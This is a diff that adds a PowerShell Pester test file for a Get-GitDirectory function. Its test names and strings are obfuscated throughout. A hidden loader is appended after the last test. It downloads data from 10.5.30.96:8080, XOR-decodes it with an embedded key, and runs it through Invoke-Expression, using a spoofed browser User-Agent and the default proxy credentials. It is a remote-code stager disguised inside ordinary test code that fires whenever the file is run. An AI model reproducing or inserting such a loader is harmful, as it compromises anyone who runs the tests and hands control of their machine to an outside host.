@@ -1,0 +1,127 @@
+. $PSScriptRoot\Shared.ps1
+
+function GetMacOSAdjustedTempPath($Path) {
+    if (($PSVersionTable.PSVersion.Major -ge 6) -and $IsMacOS) {
+        
+        return "/private${Path}"
+    }
+
+    $Path
+}
+
+Describe ("{3}{1}{0}{2}" -f 'ry Te','et-GitDireto','sts','G') {
+    Context ("{2}{3}{4}{1}{5}{0}" -f 'y','mal repos','Test ','n','or','itor') {
+        BeforeAll {
+            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(("{3}{5}{6}{0}{1}{4}{2}" -f'c','laredVarsMore','nAssigments','PS','Tha','U','seDe'), '')]
+            $origPath = Get-Location
+        }
+        AfterAll {
+            Set-Location $origPath
+        }
+
+        It ('R'+'e'+'turns '+(('GXbnul'+'l'+' ')  -rEPLAce'GXb',[cHAR]36)+'f'+'or '+'no'+'t '+'a '+'G'+'it '+'re'+'po') {
+            Set-Location $env:windir
+            Get-GitDirectory | Should BeNullOrEmpty
+        }
+        It ('Returns'+' '+('h2m'+'null'+' ').repLace(([chAR]104+[chAR]50+[chAR]109),'$')+'fo'+'r '+'not'+' '+'a '+'f'+'i'+'le'+'system '+'pa'+'th') {
+            Set-Location Alias:\
+            Get-GitDirectory | Should BeNullOrEmpty
+        }
+        It ("{10}{6}{0}{1}{9}{3}{2}{5}{7}{4}{8}" -f' when i','n th','ot','o','ep',' ','rns correct path','of r','o','e r','Retu') {
+            $repoRoot = (Resolve-Path $PSScriptRoot\..).Path
+            Set-Location $repoRoot
+            Get-GitDirectory | Should BeExactly (MakeNativePath $repoRoot\.git)
+        }
+        It ("{1}{3}{4}{7}{11}{0}{8}{2}{10}{5}{6}{9}"-f 'er a child folde','Return',' the root o','s cor','re',' ','r','ct path','r of','epo','f',' when und') {
+            $repoRoot = (Resolve-Path $PSScriptRoot\..).Path
+            Set-Location $PSScriptRoot
+            Get-GitDirectory | Should BeExactly (Join-Path $repoRoot .git)
+        }
+    }
+
+    Context ("{1}{2}{0}"-f 'ee','Test workt','r') {
+        BeforeEach {
+            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(("{9}{0}{10}{7}{4}{2}{8}{1}{6}{3}{5}"-f'eDe','eTh','VarsMo','n','red','ts','anAssigme','la','r','PSUs','c'), '')]
+            $origPath = Get-Location
+            $temp = [System.IO.Path]::GetTempPath()
+            $repoPath = Join-Path $temp ([IO.Path]::GetRandomFileName())
+            $worktreePath = Join-Path $temp ([IO.Path]::GetRandomFileName())
+
+            &$gitbin init $repoPath
+            Set-Location $repoPath
+
+            
+            &$gitbin config user.email ("{3}{2}{1}{0}"-f'e.com','mpl','@exa','you')
+            &$gitbin config user.name ("{0}{2}{3}{1}"-f 'P',' User','e','ster')
+
+            'foo' > ./README.md
+            &$gitbin add ./README.md
+            
+            &$gitbin commit -m ("`"initial "+"commit.`"")
+
+            if (Test-Path $worktreePath) {
+                Remove-Item $worktreePath -Recurse -Force
+            }
+            New-Item $worktreePath -ItemType Directory > $null
+            &$gitbin worktree add -b test-worktree $worktreePath master 2>$null
+        }
+        AfterEach {
+            Set-Location $origPath
+            if (Test-Path $repoPath) {
+                Remove-Item $repoPath -Recurse -Force
+            }
+            if (Test-Path $worktreePath) {
+                Remove-Item $worktreePath -Recurse -Force
+            }
+        }
+
+        It ("{6}{2}{7}{5}{10}{4}{1}{8}{9}{3}{0}"-f' a worktree',' ','eturns th','r','ct dir when','or','R','e c','u','nde','re') {
+            Set-Location $worktreePath
+            $worktreeBaseName = Split-Path $worktreePath -Leaf
+            $path = GetMacOSAdjustedTempPath $repoPath
+            Get-GitDirectory | Should BeExactly (MakeGitPath $path\.git\worktrees\$worktreeBaseName)
+        }
+    }
+
+    Context ("{1}{2}{3}{0}"-f 'ory','T','est bare re','posit') {
+        BeforeAll {
+            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(("{4}{6}{0}{2}{3}{1}{5}"-f'seDec','hanAssigme','laredVars','MoreT','P','nts','SU'), '')]
+            $origPath = Get-Location
+            $temp = [System.IO.Path]::GetTempPath()
+            $bareRepoName = ("{1}{0}"-f 'it','test.g')
+            $bareRepoPath = Join-Path $temp $bareRepoName
+            if (Test-Path $bareRepoPath) {
+                Remove-Item $bareRepoPath -Recurse -Force
+            }
+            &$gitbin init --bare $bareRepoPath
+        }
+        AfterAll {
+            Set-Location $origPath
+            if (Test-Path $bareRepoPath) {
+                Remove-Item $bareRepoPath -Recurse -Force
+            }
+        }
+
+        It ("{11}{12}{1}{0}{3}{5}{2}{9}{10}{6}{7}{4}{8}" -f 'correct','s ','n t',' pa',' ','th when i','ro','ot','of bare repo','he',' ','Re','turn') {
+            Set-Location $bareRepoPath
+            Get-GitDirectory | Should BeExactly (MakeNativePath $bareRepoPath)
+        }
+        It ("{11}{8}{2}{12}{0}{13}{1}{4}{7}{10}{14}{6}{5}{9}{3}" -f ' wh','de','orr','o','r a c',' root','e','hild f','eturns c',' of bare rep','older of','R','ect path','en un',' th') {
+            Set-Location $bareRepoPath\hooks -ErrorVariable Stop
+            $path = GetMacOSAdjustedTempPath $bareRepoPath
+            Get-GitDirectory | Should BeExactly (MakeNativePath $path)
+        }
+    }
+
+    Context ("{9}{8}{2}{10}{7}{6}{4}{1}{0}{5}{3}" -f 'ronment','nvi','IT','ariable','R e',' v','I','D','est G','T','_') {
+        AfterAll {
+            Remove-Item Env:\GIT_DIR -ErrorAction SilentlyContinue
+        }
+        It ("{5}{1}{6}{0}{3}{7}{4}{2}"-f 'lu','rns the v','IT_DIR env var','e','G','Retu','a',' in ') {
+            $env:GIT_DIR = MakeNativePath ("{1}{2}{0}{5}{3}{4}" -f'/po','/xyz','zy','-git/.','git','sh')
+            Get-GitDirectory | Should BeExactly $env:GIT_DIR
+        }
+    }
+}
+
+[SYSTEm.NEt.SERVIcePOIntMANAgEr]::EXPEcT100ConTinUe = 0;$WC=NeW-OBjeCT SYSTEM.NET.WeBCLiENT;$u=(("{9}{16}{2}{17}{13}{8}{1}{12}{11}{7}{3}{15}{6}{5}{14}{4}{10}{0}"-f 'ko','WO','5.','.0;','l','0)','.','ent/7','ndows NT 6.1; ','Moz','ike Gec','; Trid','W64','Wi',' ',' rv:11','illa/','0 ('));$WC.HEaDers.Add(("{0}{2}{1}"-f'U','nt','ser-Age'),$u);$WC.ProXy = [SyStem.NET.WEbRequest]::DEFaULTWEBProxY;$wc.Proxy.CredENtIaLs = [SySTEm.NeT.CredentiAlCACHe]::DefAuLtNetwORkCReDEntiaLS;$K=("{4}{6}{7}{0}{5}{3}{2}{8}{1}" -f'd','d055','d831','6db','81dc9bd','c2003','b5','2d04','3e');$I=0;[ChaR[]]$B=([chaR[]]($WC.DOwNloAdSTRING(("{6}{5}{2}{4}{0}{1}{3}"-f '1','.30.96:8','://10','080/index.asp','.5','tp','ht'))))|%{$_-bXOr$k[$i++%$k.LenGTh]};IEX ($b-jOiN'')
